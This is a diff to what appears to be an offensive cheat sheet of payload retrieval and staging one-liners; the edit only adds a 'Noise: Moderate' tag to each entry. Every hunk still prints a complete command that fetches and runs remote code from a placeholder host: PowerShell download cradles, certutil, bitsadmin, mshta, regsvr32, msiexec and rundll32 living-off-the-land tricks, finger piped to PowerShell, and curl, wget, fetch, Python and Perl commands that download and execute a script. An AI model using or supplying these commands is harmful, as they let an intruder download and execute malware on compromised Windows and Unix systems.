@@ -15,7 +15,7 @@ Compact payload retrieval and staging one-liners for Windows and Linux.
 IEX(New-Object Net.WebClient).DownloadString('http://<HOST>/payload.ps1')
 ```
 
-**Tool:** PowerShell · **Platform:** Windows · **Tags:** HTTP, Memory, PowerShell · **Context:** User
+**Tool:** PowerShell · **Platform:** Windows · **Tags:** HTTP, Memory, PowerShell · **Context:** User · **Noise:** Moderate
 
 Classic in-memory PowerShell cradle. **Signal:** heavily signatured and commonly monitored.
 
@@ -25,7 +25,7 @@ Classic in-memory PowerShell cradle. **Signal:** heavily signatured and commonly
 IEX (IWR 'http://<HOST>/payload.ps1' -UseBasicParsing).Content
 ```
 
-**Tool:** PowerShell · **Platform:** Windows · **Tags:** HTTP, Memory, PowerShell · **Context:** User
+**Tool:** PowerShell · **Platform:** Windows · **Tags:** HTTP, Memory, PowerShell · **Context:** User · **Noise:** Moderate
 
 ## certutil download
 
@@ -33,7 +33,7 @@ IEX (IWR 'http://<HOST>/payload.ps1' -UseBasicParsing).Content
 certutil.exe -urlcache -split -f http://<HOST>/payload.exe payload.exe
 ```
 
-**Tool:** certutil · **Platform:** Windows · **Tags:** LOLBin, Download · **Context:** User
+**Tool:** certutil · **Platform:** Windows · **Tags:** LOLBin, Download · **Context:** User · **Noise:** Moderate
 
 **Signal:** common LOLBin telemetry target in modern EDR baselines.
 
@@ -43,7 +43,7 @@ certutil.exe -urlcache -split -f http://<HOST>/payload.exe payload.exe
 bitsadmin /transfer job /download /priority high http://<HOST>/payload.exe C:\Windows\Tasks\payload.exe
 ```
 
-**Tool:** bitsadmin · **Platform:** Windows · **Tags:** BITS, Download, LOLBin · **Context:** User
+**Tool:** bitsadmin · **Platform:** Windows · **Tags:** BITS, Download, LOLBin · **Context:** User · **Noise:** Moderate
 
 ## mshta remote HTA
 
@@ -51,7 +51,7 @@ bitsadmin /transfer job /download /priority high http://<HOST>/payload.exe C:\Wi
 mshta.exe http://<HOST>/payload.hta
 ```
 
-**Tool:** mshta · **Platform:** Windows · **Tags:** HTA, LOLBin, Execution · **Context:** User
+**Tool:** mshta · **Platform:** Windows · **Tags:** HTA, LOLBin, Execution · **Context:** User · **Noise:** Moderate
 
 ## regsvr32 remote scriptlet
 
@@ -59,7 +59,7 @@ mshta.exe http://<HOST>/payload.hta
 regsvr32.exe /s /n /u /i:http://<HOST>/payload.sct scrobj.dll
 ```
 
-**Tool:** regsvr32 · **Platform:** Windows · **Tags:** Scriptlet, LOLBin, Proxy Execution · **Context:** User
+**Tool:** regsvr32 · **Platform:** Windows · **Tags:** Scriptlet, LOLBin, Proxy Execution · **Context:** User · **Noise:** Moderate
 
 ## curl.exe download
 
@@ -67,7 +67,7 @@ regsvr32.exe /s /n /u /i:http://<HOST>/payload.sct scrobj.dll
 curl.exe http://<HOST>/payload.exe -o payload.exe
 ```
 
-**Tool:** curl · **Platform:** Windows · **Tags:** HTTP, Download · **Context:** User
+**Tool:** curl · **Platform:** Windows · **Tags:** HTTP, Download · **Context:** User · **Noise:** Moderate
 
 ## msiexec remote package
 
@@ -75,7 +75,7 @@ curl.exe http://<HOST>/payload.exe -o payload.exe
 msiexec.exe /i http://<HOST>/payload.msi /quiet
 ```
 
-**Tool:** msiexec · **Platform:** Windows · **Tags:** MSI, Remote Package, Execution · **Context:** User
+**Tool:** msiexec · **Platform:** Windows · **Tags:** MSI, Remote Package, Execution · **Context:** User · **Noise:** Moderate
 
 ## rundll32 JavaScript execution
 
@@ -83,7 +83,7 @@ msiexec.exe /i http://<HOST>/payload.msi /quiet
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc.exe")
 ```
 
-**Tool:** rundll32 · **Platform:** Windows · **Tags:** JavaScript, LOLBin, Proxy Execution · **Context:** User
+**Tool:** rundll32 · **Platform:** Windows · **Tags:** JavaScript, LOLBin, Proxy Execution · **Context:** User · **Noise:** Moderate
 
 ## Finger to PowerShell pipeline
 
@@ -91,7 +91,7 @@ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%
 finger <USER>@<HOST> | powershell.exe -noprofile -
 ```
 
-**Tool:** finger + PowerShell · **Platform:** Windows · **Tags:** Legacy, Pipeline, Staging · **Context:** User
+**Tool:** finger + PowerShell · **Platform:** Windows · **Tags:** Legacy, Pipeline, Staging · **Context:** User · **Noise:** Moderate
 
 ## WMIC remote XSL
 
@@ -99,7 +99,7 @@ finger <USER>@<HOST> | powershell.exe -noprofile -
 wmic.exe os get /format:"http://<HOST>/payload.xsl"
 ```
 
-**Tool:** WMIC · **Platform:** Windows · **Tags:** XSL, Legacy, Proxy Execution · **Context:** User
+**Tool:** WMIC · **Platform:** Windows · **Tags:** XSL, Legacy, Proxy Execution · **Context:** User · **Noise:** Moderate
 
 **Note:** WMIC is deprecated and may be absent on newer Windows builds.
 
@@ -109,7 +109,7 @@ wmic.exe os get /format:"http://<HOST>/payload.xsl"
 curl -fsSL http://<HOST>/payload.sh | bash
 ```
 
-**Tool:** curl + bash · **Platform:** Linux/macOS · **Tags:** HTTP, Pipeline, Shell · **Context:** User
+**Tool:** curl + bash · **Platform:** Linux/macOS · **Tags:** HTTP, Pipeline, Shell · **Context:** User · **Noise:** Moderate
 
 ## wget to bash
 
@@ -117,7 +117,7 @@ curl -fsSL http://<HOST>/payload.sh | bash
 wget -qO- http://<HOST>/payload.sh | bash
 ```
 
-**Tool:** wget + bash · **Platform:** Linux · **Tags:** HTTP, Pipeline, Shell · **Context:** User
+**Tool:** wget + bash · **Platform:** Linux · **Tags:** HTTP, Pipeline, Shell · **Context:** User · **Noise:** Moderate
 
 ## curl to temporary file and execute
 
@@ -125,7 +125,7 @@ wget -qO- http://<HOST>/payload.sh | bash
 curl -fsSL http://<HOST>/payload -o /tmp/.p && chmod +x /tmp/.p && /tmp/.p
 ```
 
-**Tool:** curl · **Platform:** Linux · **Tags:** HTTP, Staging, Execution · **Context:** User
+**Tool:** curl · **Platform:** Linux · **Tags:** HTTP, Staging, Execution · **Context:** User · **Noise:** Moderate
 
 ## BSD fetch to shell
 
@@ -133,7 +133,7 @@ curl -fsSL http://<HOST>/payload -o /tmp/.p && chmod +x /tmp/.p && /tmp/.p
 fetch -qo - http://<HOST>/payload.sh | sh
 ```
 
-**Tool:** fetch · **Platform:** BSD · **Tags:** HTTP, Pipeline, Shell · **Context:** User
+**Tool:** fetch · **Platform:** BSD · **Tags:** HTTP, Pipeline, Shell · **Context:** User · **Noise:** Moderate
 
 ## Python fetch and exec
 
@@ -141,7 +141,7 @@ fetch -qo - http://<HOST>/payload.sh | sh
 python3 -c "import urllib.request;exec(urllib.request.urlopen('http://<HOST>/payload.py').read())"
 ```
 
-**Tool:** Python · **Platform:** Linux/macOS/Windows · **Tags:** HTTP, Memory, Python · **Context:** User
+**Tool:** Python · **Platform:** Linux/macOS/Windows · **Tags:** HTTP, Memory, Python · **Context:** User · **Noise:** Moderate
 
 ## Perl fetch and eval
 
@@ -149,7 +149,7 @@ python3 -c "import urllib.request;exec(urllib.request.urlopen('http://<HOST>/pay
 perl -MLWP::Simple -e 'eval get("http://<HOST>/payload.pl")'
 ```
 
-**Tool:** Perl · **Platform:** Linux/macOS · **Tags:** HTTP, Memory, Perl · **Context:** User
+**Tool:** Perl · **Platform:** Linux/macOS · **Tags:** HTTP, Memory, Perl · **Context:** User · **Noise:** Moderate
 
 ## HTTPS curl pipeline
 
@@ -157,7 +157,7 @@ perl -MLWP::Simple -e 'eval get("http://<HOST>/payload.pl")'
 curl -fkLs https://<HOST>:8443/payload.sh | bash
 ```
 
-**Tool:** curl + bash · **Platform:** Linux/macOS · **Tags:** HTTPS, Pipeline, Shell · **Context:** User
+**Tool:** curl + bash · **Platform:** Linux/macOS · **Tags:** HTTPS, Pipeline, Shell · **Context:** User · **Noise:** Moderate
 
 ## TFTP retrieve
 
@@ -165,7 +165,7 @@ curl -fkLs https://<HOST>:8443/payload.sh | bash
 tftp <HOST> -c get payload.sh
 ```
 
-**Tool:** tftp · **Platform:** Linux · **Tags:** TFTP, Legacy, File Transfer · **Context:** User
+**Tool:** tftp · **Platform:** Linux · **Tags:** TFTP, Legacy, File Transfer · **Context:** User · **Noise:** Moderate
 
 ---
 
